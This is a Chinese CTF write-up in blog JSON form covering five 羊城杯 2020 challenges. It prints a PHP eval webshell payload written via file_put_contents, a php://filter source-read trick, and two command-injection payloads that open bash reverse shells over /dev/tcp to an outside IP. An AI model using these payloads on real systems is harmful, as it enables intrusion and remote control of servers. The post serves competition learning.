{"title":"羊城杯CTF(部分，包含复现)","uid":"993573f867cfcdcc59590e5a4fe361bb","slug":"羊城杯CTF-部分","date":"2020-09-11T01:19:52.000Z","updated":"2020-09-30T04:21:50.000Z","comments":true,"path":"api/articles/羊城杯CTF-部分.json","keywords":"A1andNS","cover":[],"content":"<p>昨天有些事，就摸了三题，两题web一题杂项。其他全都靠同队大佬了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200911093604.png\" alt=\"排名\"></p>\n<h2 id=\"0x01-easyphp\"><a href=\"#0x01-easyphp\" class=\"headerlink\" title=\"0x01 easyphp\"></a>0x01 easyphp</h2><p>这题很直接给出来源代码：</p>\n<p>其中有一个file_put_contents()函数，可以写入内容要指定文件里。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">payload: \n?content&#x3D;&lt;?php eval($_POST[%27123%27])?&gt;&amp;filename&#x3D;index.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200911093535.png\" alt=\"回显\"></p>\n<p>然后我用antsword连上了index.php</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200911093729.png\" alt=\"木马\"></p>\n<p>然后在/目录下找到flag文件，读取他得到了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200911093711.png\" alt=\"flag\"></p>\n<p>GWHT{easyApache}</p>\n<p>这题还有一种解法，那就是向目录写入一个.htaccess文件，来读flag文件。</p>\n<h2 id=\"0x02-com\"><a href=\"#0x02-com\" class=\"headerlink\" title=\"0x02 com\"></a>0x02 com</h2><p>这是一题杂项题</p>\n<p>首先nc上去，给出来一个35元方程组，那么就要解这个方程组了。解出方程组后，就要按照要求构造list了。这里有个坑点啊，list里的<code>,</code>必须是中文的<code>，</code></p>\n<p>这里搞的试了好久都没有成功。</p>\n<p>cert:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">[584, 489, 423, 13, 1003, 796, 178, 429, 866, 419, 883, 856, 832, 1020, 478, 356, 293, 750, 562, 699, 427, 643, 760, 184, 821, 876, 655, 240, 487, 510, 279, 476, 672, 324, 59]<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>提交cert，就会得到flag：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200911093826.jpg\" alt=\"flag\"></p>\n<p>得到了flag。</p>\n<h2 id=\"0x03-easycon\"><a href=\"#0x03-easycon\" class=\"headerlink\" title=\"0x03 easycon\"></a>0x03 easycon</h2><p>目录扫描后，访问了index.php文件，提示eval post cmd，从中可以得知cmd可能是一个shell的密码。</p>\n<p>使用antsword去连接。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200918152436.png\" alt=\"连接\"></p>\n<p>下载bbbbbbbbb.txt文件到本地</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200918153058.png\" alt=\"txt文件\"></p>\n<p>感觉可能是base64了，所以我base64先解一下,然后binwalk分析，得知是图片，修改后缀为png</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200918153221.png\" alt=\"binwalk\"></p>\n<p>就会得到flag</p>\n<h2 id=\"下面利用赛后的复现环境复现一下其他的赛题\"><a href=\"#下面利用赛后的复现环境复现一下其他的赛题\" class=\"headerlink\" title=\"下面利用赛后的复现环境复现一下其他的赛题\"></a>下面利用赛后的复现环境复现一下其他的赛题</h2><h2 id=\"0x04-blackcat\"><a href=\"#0x04-blackcat\" class=\"headerlink\" title=\"0x04 blackcat\"></a>0x04 blackcat</h2><p>看了一圈没有发现什么东西，只有注释里提示要听歌。那我就把音乐下载到本地看看有什么玄机。</p>\n<p>查看16进制的mp3文件发现在尾部有php代码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200918205810.png\" alt=\"16进制文件\"></p>\n<p>提取出来审计代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Black-Cat-Sheriff'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'One-ear'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'˭�����Ҳ���һֻ����β�ͣ�'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$clandestine</span> <span class=\"token operator\">=</span> <span class=\"token function\">getenv</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"clandestine\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'White-cat-monitor'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token variable\">$clandestine</span> <span class=\"token operator\">=</span> <span class=\"token function\">hash_hmac</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'sha256'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'White-cat-monitor'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$clandestine</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\n<span class=\"token variable\">$hh</span> <span class=\"token operator\">=</span> <span class=\"token function\">hash_hmac</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'sha256'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'One-ear'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$clandestine</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$hh</span> <span class=\"token operator\">!==</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Black-Cat-Sheriff'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'������׼�����������������������Ҫ��׼��Ŀ�ꡣ�����Լ���������ǿ����а��ĵ��ӵ���'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">echo</span> <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nc\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'One-ear'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>利用的是hash_hmac处理数组会返回false的特点：hmac(‘sha256’,array(),$clandstine) ==false</p>\n<p>这样$hh=hash_hmac(‘sha256’,$_POST[‘One-ear’],false)</p>\n<p>然后执行one-ear参数来执行命令，可以做到反弹shell</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Black-Cat-Sheriff&#x3D;f9ecf877d7aeca395660b29214723583d72856b3d6ceee62c052e29b1873654c&amp;One-ear&#x3D;-lvp\n8888;bash -c &#39;bash -i &gt;%26 &#x2F;dev&#x2F;tcp&#x2F;xx.xx.xx.xx&#x2F;8888 0&gt;%261&#39;&amp;White-cat-monitor[]&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200918210313.png\" alt=\"flag\"></p>\n<h2 id=\"0x05-easyphp2\"><a href=\"#0x05-easyphp2\" class=\"headerlink\" title=\"0x05 easyphp2\"></a>0x05 easyphp2</h2><p>cookie传入pass=GWHT</p>\n<p>file参数可以包含文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token argument-name\">php</span><span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/read=convert.%25%36%32ase64-encode/resource=GWHT.php</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>拿到GWHT.php源码</p>\n<pre class=\"line-numbers language-php+HTML\" data-language=\"php+HTML\"><code class=\"language-php+HTML\">&lt;!DOCTYPE html&gt;\n&lt;html lang&#x3D;&quot;en&quot;&gt;\n\n&lt;head&gt;\n    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;\n    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;\n    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;\n    &lt;title&gt;count is here&lt;&#x2F;title&gt;\n\n    &lt;style&gt;\n\n        html,\n        body &#123;\n            overflow: none;\n            max-height: 100vh;\n        &#125;\n\n    &lt;&#x2F;style&gt;\n&lt;&#x2F;head&gt;\n\n&lt;body style&#x3D;&quot;height: 100vh; text-align: center; background-color: green; color: blue; display: flex; flex-direction: column; justify-content: center;&quot;&gt;\n\n&lt;center&gt;&lt;img src&#x3D;&quot;question.jpg&quot; height&#x3D;&quot;200&quot; width&#x3D;&quot;200&quot; &#x2F;&gt; &lt;&#x2F;center&gt;\n\n    &lt;?php\n    ini_set(&#39;max_execution_time&#39;, 5);\n\n    if ($_COOKIE[&#39;pass&#39;] !&#x3D;&#x3D; getenv(&#39;PASS&#39;)) &#123;\n        setcookie(&#39;pass&#39;, &#39;PASS&#39;);\n        die(&#39;&lt;h2&gt;&#39;.&#39;&lt;hacker&gt;&#39;.&#39;&lt;h2&gt;&#39;.&#39;&lt;br&gt;&#39;.&#39;&lt;h1&gt;&#39;.&#39;404&#39;.&#39;&lt;h1&gt;&#39;.&#39;&lt;br&gt;&#39;.&#39;Sorry, only people from GWHT are allowed to access this website.&#39;.&#39;23333&#39;);\n    &#125;\n    ?&gt;\n\n    &lt;h1&gt;A Counter is here, but it has someting wrong&lt;&#x2F;h1&gt;\n\n    &lt;form&gt;\n        &lt;input type&#x3D;&quot;hidden&quot; value&#x3D;&quot;GWHT.php&quot; name&#x3D;&quot;file&quot;&gt;\n        &lt;textarea style&#x3D;&quot;border-radius: 1rem;&quot; type&#x3D;&quot;text&quot; name&#x3D;&quot;count&quot; rows&#x3D;10 cols&#x3D;50&gt;&lt;&#x2F;textarea&gt;&lt;br &#x2F;&gt;\n        &lt;input type&#x3D;&quot;submit&quot;&gt;\n    &lt;&#x2F;form&gt;\n\n    &lt;?php\n    if (isset($_GET[&quot;count&quot;])) &#123;\n        $count &#x3D; $_GET[&quot;count&quot;];\n        if(preg_match(&#39;&#x2F;;|base64|rot13|base32|base16|&lt;\\?php|#&#x2F;i&#39;, $count))&#123;\n        \tdie(&#39;hacker!&#39;);\n        &#125;\n        echo &quot;&lt;h2&gt;The Count is: &quot; . exec(&#39;printf \\&#39;&#39; . $count . &#39;\\&#39; | wc -c&#39;) . &quot;&lt;&#x2F;h2&gt;&quot;;\n    &#125;\n    ?&gt;\n\n&lt;&#x2F;body&gt;\n\n&lt;&#x2F;html&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>关键在exec()函数，他会执行命令。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">count&#x3D;1&#39;+|+bash+-i+&gt;%26+&#x2F;dev&#x2F;tcp&#x2F;8.129.44.234&#x2F;8887+0&gt;%261&quot;+||+echo+&#39;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>getshell然后就可以去读flag文件了，flag在/GWHT/system/of/a/down/flag.txt</p>\n<p>但是要权限才能读，/GWHT/README里面提示密码hash</p>\n<p>解密得到密码为GWHTCTF，对应的用户GWHT，最后获取flag</p>\n","text":"昨天有些事，就摸了三题，两题web一题杂项。其他全都靠同队大佬了。 0x01 easyphp这题很直接给出来源代码： 其中有一个file_put_contents()函数，可以写入内容要指定文件里。 payload: ?content&#x3D;&lt;?php eval($_P...","link":"","photos":[],"count_time":{"symbolsCount":"4.5k","symbolsTime":"4 mins."},"categories":[{"name":"CTF","slug":"CTF","count":41,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":13,"path":"api/tags/CTF.json"},{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"Misc","slug":"Misc","count":3,"path":"api/tags/Misc.json"},{"name":"羊城杯","slug":"羊城杯","count":1,"path":"api/tags/羊城杯.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-easyphp\"><span class=\"toc-text\">0x01 easyphp</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-com\"><span class=\"toc-text\">0x02 com</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03-easycon\"><span class=\"toc-text\">0x03 easycon</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%8B%E9%9D%A2%E5%88%A9%E7%94%A8%E8%B5%9B%E5%90%8E%E7%9A%84%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E5%A4%8D%E7%8E%B0%E4%B8%80%E4%B8%8B%E5%85%B6%E4%BB%96%E7%9A%84%E8%B5%9B%E9%A2%98\"><span class=\"toc-text\">下面利用赛后的复现环境复现一下其他的赛题</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x04-blackcat\"><span class=\"toc-text\">0x04 blackcat</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x05-easyphp2\"><span class=\"toc-text\">0x05 easyphp2</span></a></li></ol>","author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Desktop File Learning","uid":"df149b563856104ed5f5e4f987c98ca6","slug":"Desktop File Learning","date":"2020-09-18T14:04:39.000Z","updated":"2020-09-19T01:53:16.000Z","comments":true,"path":"api/articles/Desktop File Learning.json","keywords":"A1andNS","cover":[],"text":"How to add a shortcuts on Linux? We often download the software from the software’s official website . But sometimes the software is a zip w...","link":"","photos":[],"count_time":{"symbolsCount":"1.9k","symbolsTime":"2 mins."},"categories":[{"name":"资源教程","slug":"资源教程","count":7,"path":"api/categories/资源教程.json"}],"tags":[{"name":"Linux","slug":"Linux","count":11,"path":"api/tags/Linux.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Python写个2048","uid":"6a4d9e181c2406d317b06b634d8dec47","slug":"Python写个2048","date":"2020-09-09T13:48:50.000Z","updated":"2020-09-18T12:50:32.000Z","comments":true,"path":"api/articles/Python写个2048.json","keywords":"A1andNS","cover":[],"text":"项目名称-2048小游戏用户行为所有的有效输入都可以转换为上下左右，游戏重置，退出这六种行为，有效输入键是WASDRQwasdrq，并且要把行为和输入关联起来。 actions = ['Up', 'Left', 'Down', 'Right', 'Restart', 'Exit'...","link":"","photos":[],"count_time":{"symbolsCount":"10k","symbolsTime":"9 mins."},"categories":[{"name":"Python","slug":"Python","count":2,"path":"api/categories/Python.json"},{"name":"学习笔记","slug":"Python/学习笔记","count":1,"path":"api/categories/Python/学习笔记.json"}],"tags":[{"name":"Python","slug":"Python","count":23,"path":"api/tags/Python.json"},{"name":"2048","slug":"2048","count":1,"path":"api/tags/2048.json"},{"name":"学习笔记","slug":"学习笔记","count":3,"path":"api/tags/学习笔记.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}